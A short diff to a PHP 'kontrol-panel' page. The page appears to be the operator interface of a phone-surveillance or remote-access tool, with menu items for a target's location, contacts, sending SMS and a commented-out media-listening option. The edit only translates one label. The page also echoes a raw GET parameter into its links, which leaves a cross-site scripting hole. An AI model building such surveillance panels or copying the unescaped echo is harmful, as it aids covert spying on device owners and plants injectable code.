@@ -68,7 +68,7 @@ if (!isset($_GET['target']) || !isset($_GET['type'])){
             <div class="list-group">
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=1" class="list-group-item <?php if ($_GET['type']==1){ echo 'active';}?>">Specifications</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=2" class="list-group-item <?php if ($_GET['type']==2){ echo 'active';}?>">Location</a>
-                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=3" class="list-group-item <?php if ($_GET['type']==3){ echo 'active';}?>"">Rehber</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=3" class="list-group-item <?php if ($_GET['type']==3){ echo 'active';}?>"">Guide</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=4" class="list-group-item <?php if ($_GET['type']==4){ echo 'active';}?>">Send SMS</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=5" class="list-group-item <?php if ($_GET['type']==5){ echo 'active';}?>">Send SMS</a>
                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=6" class="list-group-item <?php if ($_GET['type']==6){ echo 'active';}?>">Listening to media</a> -->
